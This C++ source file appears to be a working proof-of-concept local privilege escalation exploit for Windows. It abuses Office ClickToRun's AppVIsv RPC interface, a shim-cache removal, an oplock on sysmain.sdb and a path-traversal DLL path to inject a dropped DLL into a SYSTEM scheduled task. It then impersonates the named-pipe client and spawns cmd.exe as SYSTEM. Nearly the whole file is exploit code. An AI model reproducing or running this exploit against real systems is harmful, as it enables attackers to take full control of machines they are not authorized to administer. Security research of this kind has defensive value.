#include "OfficeInjector.h"

wstring g_ProcessPath;
wstring g_EventName = L"OfficeInjectorEvent";
wstring g_ResourceDirectory = L"C:\\temp";
wstring g_ResourceFileName = L"Injected.dll";

int GetPidFromName(const wstring& TargetName)
{
	DWORD processIdArray[1024] = {};
	DWORD bytesNeeded = 0;
	if (!EnumProcesses(processIdArray, sizeof(processIdArray), &bytesNeeded))
		return 0;

	const DWORD processesCount = bytesNeeded / sizeof(DWORD);
	for (int i = 0; i < processesCount; i++)
	{
		const HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, processIdArray[i]);
		if (nullptr != processHandle)
		{
			DWORD size = MAX_PATH;
			wchar_t currentProcessName[MAX_PATH] = {};
			if (QueryFullProcessImageNameW(processHandle, 0, currentProcessName, &size))
			{
				if (!_wcsicmp(TargetName.c_str(), currentProcessName))
					return processIdArray[i];
			}
			DWORD err = GetLastError();
			CloseHandle(processHandle);
		}
	}
	return 0;
}

void Callback()
{
	wcout << L"Callback called" << endl;

	// The callback will be executed when any process is launched, not just the scheduled task.
	//  Wait until the scheduled task is running so the PID can be found
	const HANDLE eventHandle = OpenEvent(SYNCHRONIZE, FALSE, g_EventName.c_str());
	const DWORD waitStatus = WaitForSingleObject(eventHandle, 5000);
	if (WAIT_OBJECT_0 != waitStatus)
	{
		wcout << L"WaitForSingleObject failed " << waitStatus << endl;
		return;
	}
	const int pid = GetPidFromName(g_ProcessPath);
	if (0 == pid)
	{
		wcout << L"pid of " << g_ProcessPath << L" not found" << endl;
		return;
	}
	wcout << L"Scheduled task pid: " << pid << endl;
	const wstring path = L"..\\..\\..\\..\\temp\\Injected.dll";
	wcout << L"Making RPC call to OfficeClickToRun" << endl;
	const AppVIsvClient client;
	client.NotifyNewChildProcess(pid, path);
}

void CompatCacheRemoveExeExported(const wstring& FilePath)
{
	/* AHC_SERVICE_DATA changes between OS versions.
	 * Calling NtApphelpCacheControl requires maintaining the various definitions of the structure, and checking the current OS version
	 * BaseUpdateAppcompatCacheWorker wraps the usage of NtApphelpCacheControl and uses the correct version of the struct based for the current OS version
	*/
	const HMODULE kernel32 = LoadLibraryW(L"kernel32.dll");
	const auto BaseUpdateAppcompatCacheWorker = reinterpret_cast<BaseUpdateAppcompatCacheWorker_func>(GetProcAddress(kernel32, "BaseUpdateAppcompatCacheWorker"));
	if (!BaseUpdateAppcompatCacheWorker(FilePath.c_str(), nullptr, TRUE))
		ThrowException("[CompatCacheRemoveExeExported] - BaseUpdateAppcompatCacheWorker failed", 0);
}

void PreventDeadLock()
{
	/* When executing the attack in 32bit, a deadlock might occur:
	 * 1. sysmain.sdb will be locked
	 * 2. The tool waits for the RPC call to OfficeClickToRun to return
	 * 3. OfficeClickToRun launches mavinject.exe for the first time
	 * 4. OfficeClickToRun tries to read sysmain.sdb for shim info about mavinject.exe
	 * 5. OfficeClickToRun is locked for reading sysmain.sdb and the tool is locked until the RPC call returns
	 *
	 * To prevent it, an RPC call is made before sysmain.sdb is locked.
	 * OfficeClickToRun will add shim info about mavinject.exe to the cache and won't read sysmain.sdb the next time mavinject.exe is launched
	 */

	const wstring path = L"AppVIsvSubsystems64.dll";
	const AppVIsvClient client;
	client.NotifyNewChildProcess(GetCurrentProcessId(), path);
}

// 
bool NtImpersonateNamedPipeClient(const HANDLE PipeHandle)
{
	OBJECT_ATTRIBUTES objectAttributes{};
	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	HANDLE eventHandle = nullptr;
	NTSTATUS status = NtCreateEvent(&eventHandle, EVENT_ALL_ACCESS, &objectAttributes, NotificationEvent, 0);
	if (!NT_SUCCESS(status))
		return false;

	IO_STATUS_BLOCK ioStatusBlock{};
	status = NtFsControlFile(PipeHandle, eventHandle, nullptr, nullptr, &ioStatusBlock, 0x11001Cu, nullptr, 0, nullptr, 0);
	if (STATUS_PENDING == status)
	{
		status = NtWaitForSingleObject(eventHandle, 0, 0);
		if (NT_SUCCESS(status))
			status = ioStatusBlock.Status;
	}
	CloseHandle(eventHandle);
	return NT_SUCCESS(status);
}

void CreateProcessAsPipeClient()
{
	SECURITY_ATTRIBUTES sa{};
	HANDLE pipeHandle = nullptr;
	HANDLE tokenHandle = nullptr;
	do
	{
		// create Security Descriptor to give all access to all the users
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.bInheritHandle = FALSE;
		if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &(sa.lpSecurityDescriptor), nullptr))
		{
			wcout << L"ConvertStringSecurityDescriptorToSecurityDescriptor failed. Error: " << GetLastError() << endl;
			break;
		}

		// Create a named pipe that the injected DLL will connect to
		pipeHandle = CreateNamedPipeW(PIPE_NAME.data(),
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_MESSAGE | PIPE_WAIT,
			1,
			0,
			0,
			0,
			&sa
		);

		if (INVALID_HANDLE_VALUE == pipeHandle)
		{
			wcout << L"Creating " << PIPE_NAME << " failed. Error: " << GetLastError() << endl;
			break;
		}

		// Wait for a client to connect to the pipe
		const bool connected = ::ConnectNamedPipe(pipeHandle, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
		if (!connected)
		{
			wcout << L"Error connecting to pipe " << PIPE_NAME << " error: " << GetLastError() << endl;
			break;
		}

		char message[1024] = {};
		DWORD bytesRead;
		ReadFile(pipeHandle, message, sizeof(message), &bytesRead, nullptr);
		std::cout << "message: " << message << endl;
		if (!NtImpersonateNamedPipeClient(pipeHandle))
		{
			wcout << L"ImpersonateNamedPipeClient failed. error: " << GetLastError() << endl;
			break;
		}

		if (!::OpenThreadToken(GetCurrentThread(), TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, true, &tokenHandle))
		{
			wcout << L"OpenThreadToken failed. error: " << GetLastError() << endl;
			break;
		}

		STARTUPINFOW startupInfo{};
		PROCESS_INFORMATION processInfo{};
		startupInfo.cb = sizeof(STARTUPINFOW);
		wstring processPath = L"C:\\windows\\system32\\cmd.exe";
		if (!CreateProcessWithTokenW(tokenHandle, LOGON_NETCREDENTIALS_ONLY, nullptr, processPath.data(), 0, nullptr, nullptr, &startupInfo, &processInfo))
		{
			wcout << L"Error creating child process. error: " << GetLastError() << endl;
			break;
		}

		wcout << L"Process started as SYSTEM. PID: " << processInfo.dwProcessId << endl;
	} while (false);

	LocalFree(sa.lpSecurityDescriptor);
	CloseHandle(pipeHandle);
	CloseHandle(tokenHandle);
	RevertToSelf();
}

int main()
{
	try
	{
		// Debug privileges are required to write into the memory of the injected process
		if (!EnableDebugPrivilegeCurrentProcess())
			ThrowException("EnableDebugPrivilegeCurrentProcess failed", GetLastError());
		wcout << L"Debug privilege enabled" << endl;

		DropResource(g_ResourceDirectory, g_ResourceFileName, MAKEINTRESOURCEA(IDR_RCDATA1), MAKEINTRESOURCEA(RT_RCDATA));
		wcout << L"Payload written to " << g_ResourceDirectory << L"\\" << g_ResourceFileName << endl;

		// Create event to control the callback execution
		const HANDLE eventHandle = CreateEventW(nullptr, FALSE, FALSE, g_EventName.c_str());
		if (nullptr == eventHandle)
			ThrowException("CreateEventW failed", GetLastError());

#ifdef _WIN64
		wstring taskName = L"Office Automatic Updates 2.0";
		wstring taskFolder = L"\\Microsoft\\Office";
#else
		wstring taskName = L"MicrosoftEdgeUpdateTaskMachineUA";
		wstring taskFolder = L"\\";
		PreventDeadLock();
#endif

		wcout << L"Targeting the scheduled task: " << taskFolder << L"\\" << taskName << endl;

		// guarantee that sysman.sdb will be read the next time the scheduled task will be executed
		g_ProcessPath.assign(GetScheduledTaskAction(taskName, taskFolder));
		wcout << L"Removing shim cache for " << g_ProcessPath.substr(g_ProcessPath.find_last_of(L"\\") + 1) << endl;
		CompatCacheRemoveExeExported(g_ProcessPath);

		// Force processes to enter a wait state when they read sysmain.sdb after they launch a child process
		const wstring path = L"C:\\windows\\apppatch\\sysmain.sdb";
		wcout << L"locking " << path << endl;
		FileOpLock* opLock = FileOpLock::CreateLock(path, L"x", Callback);

		// Creating the oplock will fail if another process has a handle to the file
		if (nullptr != opLock)
		{
			RunScheduledTask(taskName, taskFolder);
			wcout << L"task ran" << endl;

			// Create a thread that will impersonate SYSTEM and launch a new process
			const HANDLE threadHandle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(CreateProcessAsPipeClient), nullptr, 0, nullptr);

			// The callback might be called before the scheduled task is running, because an unrelated process tried to read sysmain.sdb
			// Signal the callback the scheduled task is running
			SetEvent(eventHandle);

			// Wait for the callback to return
			opLock->WaitForLock(INFINITE);
			delete opLock;

			// Wait for the thread to finish
			if (::WaitForSingleObject(threadHandle, 5000) != WAIT_OBJECT_0)
				wcout << L"WaitForSingleObject for thread failed. error: " << GetLastError() << endl;
		}
		CloseHandle(eventHandle);
	}
	catch (std::exception& ex)
	{
		wcout << ex.what() << endl;
	}
	wcout << L"done" << endl;
	return EXIT_SUCCESS;
}